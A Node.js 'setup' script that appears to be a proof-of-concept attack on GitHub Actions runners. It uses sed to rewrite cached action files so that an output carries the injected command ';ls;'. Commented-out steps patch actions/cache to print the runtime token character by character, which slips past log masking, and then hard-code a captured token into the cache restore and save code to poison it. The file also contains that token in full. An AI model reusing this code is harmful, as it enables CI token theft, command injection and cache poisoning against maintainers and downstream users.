const cl_process = require("child_process");
const fs = require("fs");

console.log("this is a setup.....")

console.log(__dirname);

// print token
// let writecontent = 'console.log(JSON.stringify(token.split("")));';

// cl_process.exec(`sed -i '3458i ${writecontent}' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

let writecontent = 'core.setOutput("time", ";ls;");';
cl_process.exec(`sed -i '24/.*/${writecontent}/' /home/runner/work/_actions/musset0/my-action/main/index.js`, (err, stdout, stderr) => {
    if (err){
        console.log(err);
        return;
    }
    console.log(`stdout: ${stdout.toString()}`);
    console.log(`stderr: ${stderr}`);
});


// use the printed token
// let writecontent = 'const token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6Ikh5cTROQVRBanNucUM3bWRydEFoaHJDUjJfUSJ9.eyJuYW1laWQiOiJkZGRkZGRkZC1kZGRkLWRkZGQtZGRkZC1kZGRkZGRkZGRkZGQiLCJzY3AiOiJBY3Rpb25zLkdlbmVyaWNSZWFkOjAwMDAwMDAwLTAwMDAtMDAwMC0wMDAwLTAwMDAwMDAwMDAwMCBBY3Rpb25zLlJlc3VsdHM6N2JmODQzZWMtZGZlMS00ZDQwLTkxYTItODgyZTZhNWRmZDgxOjY4YjE1ODJmLTE2NTEtNTI0YS1mMmQzLWM4YWE4OWU5ZWZmNSBBY3Rpb25zLlVwbG9hZEFydGlmYWN0czowMDAwMDAwMC0wMDAwLTAwMDAtMDAwMC0wMDAwMDAwMDAwMDAvMTpCdWlsZC9CdWlsZC8zNTEgTG9jYXRpb25TZXJ2aWNlLkNvbm5lY3QgUmVhZEFuZFVwZGF0ZUJ1aWxkQnlVcmk6MDAwMDAwMDAtMDAwMC0wMDAwLTAwMDAtMDAwMDAwMDAwMDAwLzE6QnVpbGQvQnVpbGQvMzUxIiwiSWRlbnRpdHlUeXBlQ2xhaW0iOiJTeXN0ZW06U2VydmljZUlkZW50aXR5IiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvc2lkIjoiREREREREREQtRERERC1ERERELUREREQtREREREREREREREREIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9wcmltYXJ5c2lkIjoiZGRkZGRkZGQtZGRkZC1kZGRkLWRkZGQtZGRkZGRkZGRkZGRkIiwiYXVpIjoiMjY3NzI2NjctZTQ2OS00MjM5LTg5ZWMtMDUxMWU2MjY2MjYyIiwic2lkIjoiYzRjNGMzNzEtZjcyMi00ZWZhLWE2Y2UtNTllMjA4NzBiMzE4IiwiYWMiOiJbe1wiU2NvcGVcIjpcInJlZnMvaGVhZHMvbWFpblwiLFwiUGVybWlzc2lvblwiOjN9XSIsImFjc2wiOiIxMCIsIm9yY2hpZCI6IjdiZjg0M2VjLWRmZTEtNGQ0MC05MWEyLTg4MmU2YTVkZmQ4MS5oZWxsb193b3JsZF9qb2IuX19kZWZhdWx0IiwiaXNzIjoidnN0b2tlbi5hY3Rpb25zLmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImF1ZCI6InZzdG9rZW4uYWN0aW9ucy5naXRodWJ1c2VyY29udGVudC5jb218dnNvOmRiNDZmZDE4LTMxOWQtNGRkYS1hODBjLWIyN2I5NzBkZDZhMiIsIm5iZiI6MTcwMDc2NTgwMywiZXhwIjoxNzAwNzg4NjAzfQ.mXu3EO5YuOSUPIDBvAhftnQE0bQWpxc84WQjaar7bU8-wHiwVuHlntTVk8OwmUXJjdZOM3ti6hwD9B9dK1buNSouhoSNimXdRs8GfDraWz0oc5eOWSL3EoP90ypeMXFiotXTQ4dIFSHQDC-WBdsD16xePrE-qpFFwQC_I77A7Jxj27TkiWiMVu0JoJXmqmqhPOd4iAkxY7wPTUP1-xrbuuOXCNj4_UBPT95NAAxiakHjxMRaitEwyras0z6wQMpeXmnS9G7Ocp6aFiNOqS0yt2gaGykyJGCqQ59wUwkAWkKVb9ic88ZQcb12L8imZE4WXEF4JrCL6pSTjOxtMO_UMw"';

// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/restore/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

// cl_process.exec(`sed -i '3457s/.*/${writecontent}/' /home/runner/work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
//     if (err){
//         console.log(err);
//         return;
//     }
//     console.log(`stdout: ${stdout.toString()}`);
//     console.log(`stderr: ${stderr}`);
// });

